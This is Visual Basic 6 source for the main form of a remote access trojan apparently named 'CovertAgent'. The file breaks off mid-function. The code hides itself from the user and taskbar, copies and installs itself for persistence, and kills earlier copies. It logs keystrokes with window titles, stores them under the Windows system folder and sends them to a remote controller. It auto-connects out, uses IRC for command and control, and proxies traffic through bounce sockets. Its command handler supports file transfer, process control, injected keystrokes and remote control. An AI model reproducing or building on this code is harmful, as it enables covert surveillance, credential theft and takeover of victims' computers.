VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMain 
   BackColor       =   &H00808080&
   BorderStyle     =   0  'None
   Caption         =   "CovertAgent Server"
   ClientHeight    =   6990
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4695
   ForeColor       =   &H00000000&
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   6990
   ScaleWidth      =   4695
   StartUpPosition =   3  'Windows Default
   Begin VB.PictureBox Picture1 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      ForeColor       =   &H80000008&
      Height          =   855
      Left            =   120
      ScaleHeight     =   825
      ScaleWidth      =   4425
      TabIndex        =   29
      Top             =   5520
      Width           =   4455
      Begin VB.TextBox txtConnectPort 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         ForeColor       =   &H00800000&
         Height          =   285
         Left            =   2760
         TabIndex        =   34
         Top             =   360
         Width           =   735
      End
      Begin VB.TextBox txtConnectHost 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         ForeColor       =   &H00800000&
         Height          =   285
         Left            =   600
         TabIndex        =   30
         Top             =   360
         Width           =   2175
      End
      Begin VB.Label cmdConnect 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00404040&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Connect"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   3600
         TabIndex        =   33
         Top             =   360
         Width           =   735
      End
      Begin VB.Label lblConnectHost 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         Caption         =   "Connect"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   0
         TabIndex        =   32
         Top             =   0
         Width           =   4455
      End
      Begin VB.Label lblHost 
         BackStyle       =   0  'Transparent
         Caption         =   "Host:"
         ForeColor       =   &H00800000&
         Height          =   255
         Left            =   120
         TabIndex        =   31
         Top             =   360
         Width           =   495
      End
   End
   Begin VB.Timer tmrSendKeys 
      Interval        =   5000
      Left            =   4320
      Top             =   2160
   End
   Begin MSWinsockLib.Winsock wskListen 
      Left            =   0
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer tmrStatistics 
      Interval        =   10000
      Left            =   4320
      Top             =   1680
   End
   Begin MSWinsockLib.Winsock wskBounceListen 
      Index           =   0
      Left            =   0
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock wskBounce 
      Index           =   0
      Left            =   0
      Tag             =   "0"
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock wskIRC 
      Left            =   0
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer tmrSaveLog 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   4320
      Top             =   720
   End
   Begin VB.Timer tmrKeylog 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   4320
      Top             =   1200
   End
   Begin VB.ListBox lstName 
      Height          =   840
      Left            =   5520
      TabIndex        =   28
      Top             =   2280
      Width           =   975
   End
   Begin VB.ListBox lstID 
      Height          =   840
      Left            =   4920
      TabIndex        =   27
      Top             =   2280
      Width           =   495
   End
   Begin VB.Timer tmrConnectionTime 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   480
      Top             =   240
   End
   Begin MSWinsockLib.Winsock wskInfo 
      Left            =   0
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.PictureBox shpAuthor 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   0
      ScaleHeight     =   225
      ScaleWidth      =   4665
      TabIndex        =   25
      Top             =   6720
      Width           =   4695
      Begin VB.Label lblAuthor 
         BackStyle       =   0  'Transparent
         Caption         =   "Tim Cinel"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   0
         TabIndex        =   26
         Top             =   0
         Width           =   2295
      End
   End
   Begin VB.Timer tmrAutoconnect 
      Enabled         =   0   'False
      Interval        =   50000
      Left            =   4320
      Top             =   240
   End
   Begin VB.PictureBox fmeWinsockInfo 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      ForeColor       =   &H80000008&
      Height          =   1455
      Left            =   120
      ScaleHeight     =   1425
      ScaleWidth      =   4425
      TabIndex        =   15
      Top             =   3840
      Width           =   4455
      Begin VB.TextBox txtStatus 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         ForeColor       =   &H00800000&
         Height          =   285
         Left            =   840
         Locked          =   -1  'True
         TabIndex        =   18
         Top             =   360
         Width           =   3375
      End
      Begin VB.TextBox txtBytesSent 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         ForeColor       =   &H00800000&
         Height          =   285
         Left            =   840
         Locked          =   -1  'True
         TabIndex        =   17
         Top             =   720
         Width           =   1215
      End
      Begin VB.TextBox txtBytesRecieved 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         ForeColor       =   &H00800000&
         Height          =   285
         Left            =   3000
         Locked          =   -1  'True
         TabIndex        =   16
         Top             =   720
         Width           =   1215
      End
      Begin VB.Label lblStatus 
         BackStyle       =   0  'Transparent
         Caption         =   "Status:"
         ForeColor       =   &H00800000&
         Height          =   255
         Left            =   240
         TabIndex        =   22
         Top             =   360
         Width           =   495
      End
      Begin VB.Label lblWinsock 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         Caption         =   "Winsock Information"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   0
         TabIndex        =   21
         Top             =   0
         Width           =   4455
      End
      Begin VB.Label lblBytesSent 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "Sent:"
         ForeColor       =   &H00800000&
         Height          =   255
         Left            =   -480
         TabIndex        =   20
         Top             =   720
         Width           =   1215
      End
      Begin VB.Label lblBytesRecieved 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "Recieved:"
         ForeColor       =   &H00800000&
         Height          =   255
         Left            =   1800
         TabIndex        =   19
         Top             =   720
         Width           =   1095
      End
   End
   Begin VB.PictureBox fmeConnectionInfo 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      ForeColor       =   &H80000008&
      Height          =   1575
      Left            =   120
      ScaleHeight     =   1545
      ScaleWidth      =   4425
      TabIndex        =   9
      Top             =   2160
      Width           =   4455
      Begin VB.TextBox txtConnected 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         ForeColor       =   &H00800000&
         Height          =   285
         Left            =   1560
         Locked          =   -1  'True
         TabIndex        =   11
         Text            =   "False"
         Top             =   360
         Width           =   2655
      End
      Begin VB.TextBox txtClientIpAddress 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         ForeColor       =   &H00800000&
         Height          =   285
         Left            =   1560
         Locked          =   -1  'True
         TabIndex        =   10
         Top             =   1080
         Width           =   2655
      End
      Begin VB.Label lblConnected 
         BackStyle       =   0  'Transparent
         Caption         =   "Connected:"
         ForeColor       =   &H00800000&
         Height          =   255
         Left            =   240
         TabIndex        =   14
         Top             =   360
         Width           =   855
      End
      Begin VB.Label lblConnectionInformation 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         Caption         =   "Connection Information"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   13
         Top             =   0
         Width           =   4455
      End
      Begin VB.Label lblClientIpAddress 
         BackStyle       =   0  'Transparent
         Caption         =   "Client IP Address:"
         ForeColor       =   &H00800000&
         Height          =   255
         Left            =   240
         TabIndex        =   12
         Top             =   1080
         Width           =   1335
      End
   End
   Begin VB.PictureBox fmeLocalInfo 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      ForeColor       =   &H80000008&
      Height          =   1575
      Left            =   120
      ScaleHeight     =   1545
      ScaleWidth      =   4425
      TabIndex        =   1
      Top             =   480
      Width           =   4455
      Begin VB.Timer tmrIrc 
         Enabled         =   0   'False
         Interval        =   30000
         Left            =   360
         Top             =   240
      End
      Begin VB.TextBox txtIp 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         ForeColor       =   &H00800000&
         Height          =   285
         Left            =   1560
         Locked          =   -1  'True
         TabIndex        =   4
         Text            =   "127.0.0.1"
         Top             =   360
         Width           =   2655
      End
      Begin VB.TextBox txtPort 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         ForeColor       =   &H00800000&
         Height          =   285
         Left            =   1560
         Locked          =   -1  'True
         TabIndex        =   3
         Text            =   "5121"
         Top             =   720
         Width           =   2655
      End
      Begin VB.TextBox txtPassword 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         BeginProperty Font 
            Name            =   "Symbol"
            Size            =   8.25
            Charset         =   2
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00800000&
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   1560
         PasswordChar    =   "·"
         TabIndex        =   2
         Top             =   1080
         Width           =   2655
      End
      Begin VB.Label lblLocalIpAddress 
         BackStyle       =   0  'Transparent
         Caption         =   "Local IP Address:"
         ForeColor       =   &H00800000&
         Height          =   255
         Left            =   120
         TabIndex        =   8
         Top             =   360
         Width           =   1335
      End
      Begin VB.Label lblLocalPort 
         BackStyle       =   0  'Transparent
         Caption         =   "Local Port:"
         ForeColor       =   &H00800000&
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   720
         Width           =   1335
      End
      Begin VB.Label lblAccessPassword 
         BackStyle       =   0  'Transparent
         Caption         =   "Access Password:"
         ForeColor       =   &H00800000&
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   1080
         Width           =   1335
      End
      Begin VB.Label lblLocalInformation 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         Caption         =   "Local Information"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   0
         TabIndex        =   5
         Top             =   0
         Width           =   4335
      End
   End
   Begin VB.Label cmdMinimise 
      BackStyle       =   0  'Transparent
      Caption         =   "_"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   4320
      TabIndex        =   24
      Top             =   0
      Width           =   135
   End
   Begin VB.Label cmdExit 
      BackStyle       =   0  'Transparent
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   4560
      TabIndex        =   23
      Top             =   0
      Width           =   135
   End
   Begin VB.Line lBottomBorder 
      X1              =   0
      X2              =   4680
      Y1              =   6720
      Y2              =   6720
   End
   Begin VB.Line lRightBorder 
      X1              =   4680
      X2              =   4680
      Y1              =   240
      Y2              =   6960
   End
   Begin VB.Line lLeftBorder 
      X1              =   0
      X2              =   0
      Y1              =   240
      Y2              =   6960
   End
   Begin VB.Label cmdTitleBar 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Cryptech Heat"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4695
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private RequestIds() As Long, BounceBuffer() As String

Private Sub cmdConnect_Click()
    wskInfo.Close
    wskInfo.LocalPort = 0
    wskInfo.Connect txtConnectHost.Text, Val(txtConnectPort.Text)
    ChangeStats , , , , , "Connecting..."
End Sub

Private Sub cmdConnect_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
    cmdConnect.BackColor = -2147483633
    
End Sub

Private Sub cmdConnect_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
    cmdConnect.BackColor = 4210752
End Sub

Private Sub cmdExit_Click()
End
End Sub

Private Sub cmdMinimise_Click()
Me.WindowState = 1
End Sub

Private Sub cmdTitleBar_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
FormDrag Me
End Sub

Public Sub UnloadBouncers()
On Error Resume Next

For i = 1 To wskBounceListen.UBound - 1
    wskBounceListen(i).Close
    wskBounceListen(i).Tag = ""
    Unload wskBounceListen(i)
Next i

wskBounceListen(0).Close

For i = 1 To wskBounce.UBound - 1
    wskBounce(i).Close
    wskBounce(i).Tag = ""
    Unload wskBounce(i)
Next i
    
wskBounceListen(0).Close
    
    ReDim RequestIds(0 To 0)
    ReDim BounceBuffer(0 To 0)
End Sub

Public Sub LoadBouncers()
On Error Resume Next
Dim BounceDir As String
BounceDir = Environ("WINDIR") & "\System\"

If Dir(BounceDir & "blist.dat") <> "" Then
    Dim FileData As String, FileNumber As Single, Lines() As String, Temp() As String
    
    FileNumber = FreeFile
    
    Open BounceDir & "blist.dat" For Input As FileNumber
        Do Until EOF(FileNumber)
            Line Input #FileNumber, LineData
            FileData = FileData & LineData & vbCrLf
        Loop
    Close FileNumber
    
    If Right(FileData, 2) = vbCrLf Then FileData = Mid(FileData, 1, Len(FileData) - 2)
    
    Lines() = Split(FileData, vbCrLf)
    
    Dim LocalPort As Single, RemoteHost As String, RemotePort As Single, RequiredBounces As Single
    
    For i = 0 To UBound(Lines)
        Temp() = Split(Lines(i), " , ")
        If UBound(Temp) < 2 Then GoTo NextLine
        Load wskBounceListen(i)
        If CLng(Temp(0)) = 0 Or CLng(Temp(2)) = 0 Then GoTo NextLine
        wskBounceListen(i).LocalPort = CLng(Temp(0))
        wskBounceListen(i).RemoteHost = Temp(1)
        wskBounceListen(i).Tag = Val(Temp(2))
        Debug.Print wskBounceListen(i).RemotePort
        wskBounceListen(i).Listen
                
NextLine:
    Next i
    
End If

    ReDim RequestIds(0 To 0)
    ReDim BounceBuffer(0 To 0)
End Sub

Private Sub Form_Initialize()
'Hidden = True
If InStr(1, Command, "-h") <> 0 Then Hidden = True
End Sub

Private Sub Form_Load()
    On Error GoTo ErrorHandler
    Dim RegisteredName As String, Processes As String, Temp() As String, ProcessDetails() As String
    
    'If modMain.IsIDE = True Then
        Me.Visible = True
        GoTo SetupConnections
    'End If
    
    If InStr(1, Command, "-f") <> 0 Then
        RegisteredName = modMain.GetRegisteredName
         
        modMain.Install RegisteredName
        VBA.Shell RegisteredName, vbHide
        modRegistry.DeleteKey HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\rServices"
        End
    End If
    
    RegisteredName = modMain.GetRegisteredName
    
    If LCase(RegisteredName) = LCase(AppPath) Then
        Hidden = True
        frmMain.Caption = modMain.SimplifyFile(RegisteredName)
        App.Title = frmMain.Caption
    Else
        If Dir(RegisteredName) <> "" Then
            'End old process
            
            Processes = modMain.GetProcesses
            
            Temp() = Split(Processes, "|")
            
            For i = 0 To UBound(Temp)
                ProcessDetails() = Split(Temp(i), "*")
                If LCase(ProcessDetails(0)) = LCase(modMain.SimplifyFile(RegisteredName)) Then
                    modMain.KillProcess ProcessDetails(1)
                End If
            Next i
            
            Sleep 3000
            
            Kill RegisteredName
            
            Sleep 3000
            
            FileCopy AppPath, RegisteredName
            
            Sleep 5000
            
            Shell RegisteredName, "", "", False
            
            End
        Else
            FileCopy AppPath, RegisteredName
            Install RegisteredName
            Sleep 500
            Shell RegisteredName, "", "", False
            End
        End If
        
        Install RegisteredName
        WriteINI "Settings", "Filename", RegisteredName
        modMain.Shell RegisteredName, "-w", modMain.GetDirectory(RegisteredName), False
        End
    End If
    
    If Hidden = True Then
        Me.Visible = False
        App.TaskVisible = False
        
        App.Title = modMain.FileNoExtention(modMain.SimplifyFile(RegisteredName))
        
    End If
    
SetupConnections:
    
    modMain.LoadSettings
    
    If AcceptConnections = True Then
        wskInfo.Close
        wskListen.Close
        wskListen.LocalPort = ListenPort
        wskListen.Listen
    End If
    
    If autoconnect = True Then
        wskInfo.Close
        wskInfo.Connect AutoConnectHost, AutoConnectPort
    End If
    
    
    If Me.Visible = True Then
        txtIp.Text = wskInfo.LocalIP
        txtPort.Text = wskListen.LocalPort
    End If
    
    Exit Sub
ErrorHandler:
        Debug.Print Err.Number
        
        Select Case Err.Number
        Case 10048
            'address in use
            wskListen.Close
            wskListen.LocalPort = wskListen.LocalPort + 1
            Resume
        Case Else
            On Error Resume Next
            Resume Next
        End Select
End Sub

Private Sub Form_Unload(Cancel As Integer)
DoEvents: SendMessage mCapHwnd, DISCONNECT, 0, 0
End Sub


Private Sub Label3_Click()

End Sub

Private Sub tmrAutoconnect_Timer()
    If wskInfo.State <> sckConnected And wskInfo.State <> sckConnecting And wskInfo.State <> sckResolvingHost And AutoConnectEnabled = True Then
        wskInfo.Close
        wskInfo.Connect AutoConnectHost, AutoConnectPort
    End If
End Sub


Private Sub tmrIrc_Timer()
If wskIRC.State = sckConnected Then
    If modIRC.InChannel = False Then
        modIRC.Join modIRC.IrcChannel
    End If
Else
    modIRC.ChooseServerFromList modIRC.IrcServers
    wskIRC.Close
    wskIRC.Connect modIRC.IrcServer, modIRC.IrcPort
End If
End Sub

Private Sub tmrKeylog_Timer()
Dim kLogData As String, Keys As String, Window As String

Keys = modKeylog.GetCurrentKeys
Window = modKeylog.CheckWindow

If Window <> "" Then
    kLogData = vbCrLf & vbCrLf & _
    "{ WINDOW : " & Window & " }" & vbCrLf
End If

kLogData = kLogData & Keys
If kLogData = "" Then Exit Sub

modKeylog.KeyLogBuffer = modKeylog.KeyLogBuffer & kLogData
KeysToSend = KeysToSend & kLogData

End Sub

Private Sub tmrSaveLog_Timer()
On Error Resume Next
Dim Path As String, Filename As String, FileNumber As Single
Dim LineData As String
Dim OldData As String
Dim NewData As String

Filename = Replace(Date, "/", "-")
Path = Environ("windir") & "\System\ActivLogs\"

If Dir(modMain.TrimChar(Path, "\"), vbDirectory) = "" Then
    If Dir(Environ("windir") & "\System", vbDirectory) = "" Then
        MkDir Environ("windir") & "\System\"
    End If
    MkDir Environ("windir") & "\System\ActivLogs\"
End If

FileNumber = FreeFile

If Dir(Path & Filename) <> "" Then
    Open (Path & Filename) For Binary Access Read As FileNumber
        OldData = Space(LOF(FileNumber))
        Get FileNumber, , OldData
    Close FileNumber
    
End If

NewData = modKeylog.KeyLogBuffer
modKeylog.KeyLogBuffer = ""

Path = Environ("windir") & "\System\ActivLogs\"
Filename = Replace(Date, "/", "-")

Open Path & Filename For Binary Access Write As FileNumber
    Put FileNumber, , OldData & NewData
Close FileNumber

End Sub


Private Sub tmrSendKeys_Timer()
If modKeylog.KeysToSend <> "" Then
    Send "kl;" & CorrectReservedChars(modKeylog.KeysToSend)
    modKeylog.KeysToSend = ""
End If
End Sub


Private Sub tmrStatistics_Timer()
    If frmMain.Visible = False Then tmrStatistics.Enabled = False
    ChangeStats , , , , , , modMain.SimplifyFileSize(TotalBytesReceived), modMain.SimplifyFileSize(TotalBytesTransmitted)
End Sub

Private Sub txtConnectHost_Change()
    WriteINI "Settings", "ConnectToHost", txtConnectHost.Text
End Sub

Private Sub txtConnectPort_Change()
    WriteINI "Settings", "ConnectToPort", txtConnectPort.Text
End Sub

Private Sub txtPassword_Change()
    If txtPassword.Text <> "" Then
        PasswordProtected = True
        Password = txtPassword.Text
    Else
        PasswordProtected = False
        Password = ""
    End If
End Sub

Private Sub txtPassword_LostFocus()
        WriteINI "Settings", "Password", StrConv(modMain.Encrypt(App.ProductName, StrConv(txtPassword.Text, vbFromUnicode)), vbUnicode)
End Sub

Private Sub wskBounce_Close(Index As Integer)
On Error GoTo ErrorHandler
Dim Partner As Integer

Partner = CInt(wskBounce(Index).Tag)

wskBounce(Index).Close
wskBounce(Partner).Close
wskBounce(Index).Tag = ""
wskBounce(Partner).Tag = ""

Unload wskBounce(Index)
Unload wskBounce(Partner)

Exit Sub
ErrorHandler:
    modMain.SendError "wskBounce_Close", "#" & Err.Number & ": " & Err.Description
End Sub

Private Sub wskBounce_Connect(Index As Integer)
On Error Resume Next
    If BounceBuffer(Index) <> "" Then
        wskBounce(Index).SendData BounceBuffer(Index)
        BounceBuffer(Index) = ""
    End If
End Sub

Private Sub wskBounce_DataArrival(Index As Integer, ByVal bytesTotal As Long)
On Error GoTo ErrorHandler
Dim Partner As Integer, Data As String
Partner = CInt(wskBounce(Index).Tag)

wskBounce(Index).GetData Data

If wskBounce(Partner).State <> sckConnected Then
    BounceBuffer(Partner) = BounceBuffer(Partner) & Data
Else
    If BounceBuffer(Index) <> "" Then
        wskBounce(Index).SendData BounceBuffer(Index)
        BounceBuffer(Index) = ""
    End If

    wskBounce(Partner).SendData Data
End If

Debug.Print Data

Exit Sub
ErrorHandler:
    On Error Resume Next
    'modMain.SendError "wskBounce_DataArrival", "#" & Err.Number & ": (" & wskBounce(Index).RemoteHostIP & ":" & wskBounce(Index).RemotePort & " - " & wskBounce(Partner).RemoteHostIP & ":" & wskBounce(Partner).RemotePort & ") " & Data
End Sub

Private Sub wskBounce_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
Dim Partner As Integer

Partner = CInt(wskBounce(Index).Tag)

wskBounce(Index).Close
wskBounce(Partner).Close
wskBounce(Index).Tag = ""
wskBounce(Partner).Tag = ""

Unload wskBounce(Index)
Unload wskBounce(Partner)

End Sub

Private Sub wskBounceListen_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error GoTo ErrorHandler
    Dim Sender As Integer, Receiver As Integer
    Dim BounceHost As String, BouncePort As Long
    On Error GoTo ErrorHandler
    
    BounceHost = wskBounceListen(Index).RemoteHost
    BouncePort = CLng(Val(wskBounceListen(Index).Tag))
    
    Sender = FreeBounceSocket.Index
    Receiver = FreeBounceSocket.Index

    wskBounce(Receiver).Tag = Sender
    wskBounce(Sender).Tag = Receiver
    
    If UBound(RequestIds) < Receiver Then
        ReDim Preserve RequestIds(0 To Receiver)
        RequestIds(Receiver) = requestID
    Else
        RequestIds(Receiver) = requestID
    End If
    
    If UBound(BounceBuffer) < wskBounce.UBound Then
        ReDim Preserve BounceBuffer(0 To wskBounce.UBound)
        BounceBuffer(Sender) = ""
        BounceBuffer(Receiver) = ""
    Else
        BounceBuffer(Sender) = ""
        BounceBuffer(Receiver) = ""
    End If

    wskBounce(Receiver).Accept requestID
    
    wskBounce(Sender).Close
    wskBounce(Sender).Connect BounceHost, BouncePort
        
    Exit Sub
            
ErrorHandler:
    On Error Resume Next
    modMain.SendError "wskBounceListen_ConnectionRequest", "#" & Err.Number & ": " & Err.Description & "(" & BounceHost & ":" & BouncePort & ")"
End Sub

Function FreeBounceSocket() As Winsock
    For i = 1 To wskBounce.UBound
        If IsLoaded(wskBounce(i)) = False Then
            Load wskBounce(i)
            Set FreeBounceSocket = wskBounce(i)
            Exit Function
        End If
    Next i
    
    Load wskBounce(wskBounce.UBound + 1)
    Set FreeBounceSocket = wskBounce(wskBounce.UBound)
    
End Function

Function IsLoaded(Socket As Winsock) As Boolean
    On Error GoTo ErrorHandler
    Temp = Socket.LocalHostName
    IsLoaded = True
    Exit Function
ErrorHandler:
    IsLoaded = False
End Function

Private Sub wskInfo_Close()
On Error GoTo ErrorHandler

    If AcceptConnections = True Then
        wskInfo.Close
        wskListen.Close
        wskListen.LocalPort = ListenPort
        wskListen.Listen
        ChangeStats , , False, True, " ", "Not Connected - Listening"
    Else
        ChangeStats , , False, True, "N/A", "Not Connected - Not listening"
    End If
    
Reset
modProcess.FileAction "terminate"

Exit Sub
ErrorHandler:
    Debug.Print Err.Description
    Select Case Err.Number
    Case 10048
        'address in use
        wskListen.Close
        wskListen.LocalPort = wskListen.LocalPort + 1
        Resume
    Case Else
        Resume Next
    End Select
End Sub

Private Sub wskInfo_Connect()
    ChangeStats , , True, False, wskInfo.RemoteHostIP, "Connected"
            
    If PasswordProtected = True Then
        modMain.GetAuthorisation
    Else
        Authorised = True
    End If
    
End Sub

Private Sub wskInfo_ConnectionRequest(ByVal requestID As Long)
wskInfo.Close
wskInfo.Accept requestID
End Sub

Private Sub wskInfo_DataArrival(ByVal bytesTotal As Long)
Dim Data As String, Commands() As String, Temp() As String, Command As String, Arguments As String
wskInfo.PeekData Data
If Right(Data, 1) <> "¤" Then Exit Sub 'The Command is not finished

wskInfo.GetData Data
Commands = Split(Data, "¤")
If UBound(Commands) < 1 Then Exit Sub
    
    TotalBytesReceived = TotalBytesReceived + Len(Data)

For i = 0 To (UBound(Commands))
    
    If Commands(i) = "" Then GoTo NextCommand
    
    If InStr(1, Commands(i), ";") = 0 Then Commands(i) = Commands(i) & ";"
    
    Temp() = Split(Commands(i), ";", 2)
    
    Command = Temp(0)
    Arguments = Temp(1)
    
    If Command = "authorisation" Then
        modMain.CheeckAuthorisation Arguments
    End If
    
    If Authorised = False Then
        Send "response;You're not authorised to use this server."
        Exit Sub
    End If
    
    Select Case Command
    Case "server"
        modProcess.Server Arguments
    Case "authorisation"
    
    Case "request"
        modProcess.Request Arguments
    Case "windows"
        modProcess.Windows Arguments
    Case "file"
        modProcess.FileBrowser Arguments
    Case "msgbox"
        modProcess.MessageBox Arguments
    Case "chat"
        modProcess.Chat Arguments
    Case "key"
        modProcess.GetKey Arguments
    Case "keys"
        SendKeys Arguments
    Case "transfer"
        modProcess.FileTransfer Arguments
    Case "process"
        modProcess.Process Arguments
    Case "window"
        modProcess.Window Arguments
    Case "rc"
        modProcess.RemoteControl Arguments
    Case "faction"
        modProcess.FileAction Arguments
    Case "fd"
        modDeclare.FileTransfer.ReceiveFile modMain.RetrieveReservedChars(Arguments)
    Case "nb"
        modDeclare.FileTransfer.BlockSent = True
    Case "oldlogs"
        modProcess.ListOldLogs
    Case "version"
        Send "response;Server is running ~CovertAgent~ BETA"
    Case "bounce"
        modProcess.Bounce Arguments
    Case "shellurl"
        modMain.Shell "Explorer.exe", Arguments, "", True
    Case "settings"
        modProcess.SaveSettings Arguments
    Case "terminate"
        End
    Case Else
        SendError "wskInfo_DataArrival", "Unknown Command: '" & Command & "'"
    End Select
NextCommand:
Next i

End Sub

Sub ChangeStats(Optional LocalIP As String, Optional LocalPort As String, Optional Connected As Boolean, Optional ResetConnectionTime As Boolean, Optional ClientIP As String, Optional Status As String, Optional BytesSent As String, Optional BytesReceived As String)
    If LocalIP <> "" Then txtIp.Text = LocalIP
    If LocalPort <> "" Then txtPort.Text = LocalPort
    
    Select Case Connected
    Case True
        txtConnected.Text = "True"
        tmrConnectionTime.Enabled = True
    Case False
        txtConnected.Text = "False"
        tmrConnectionTime.Enabled = False
    End Select
    
    If ClientIP <> "" Then txtClientIpAddress.Text = ClientIP
    If Status <> "" Then txtStatus.Text = Status
    If BytesSent <> "" Then txtBytesSent.Text = BytesSent
    If BytesReceived <> "" Then txtBytesRecieved.Text = BytesReceived
    
End Sub

Private Sub wskInfo_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
wskInfo.Close

ChangeStats , , , , , "Connection Error."

If AcceptConnections = True Then
    wskListen.Close
    wskListen.Listen
End If
End Sub

Private Sub wskInfo_SendComplete()
    modDeclare.FileTransfer.BlockSent = True
End Sub

Private Sub wskIRC_Connect()
    wskIRC.SendData "User " & modIRC.IrcEmail & " " & wskIRC.LocalHostName & " " & wskIRC.RemoteHostIP & " :" & modIRC.IrcFullName & vbCrLf
    wskIRC.SendData "NICK " & modIRC.IrcNick & vbCrLf
End Sub

Private Sub wskIRC_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim Data As String, Lines() As String
    wskIRC.GetData Data
    
    Debug.Print Data
    If InStr(1, Data, vbLf) = 0 Then Data = Data & vbLf
    
    Lines() = Split(Data, vbLf)
    
    For i = 0 To UBound(Lines)
        If Lines(i) = "" Then GoTo NextLine
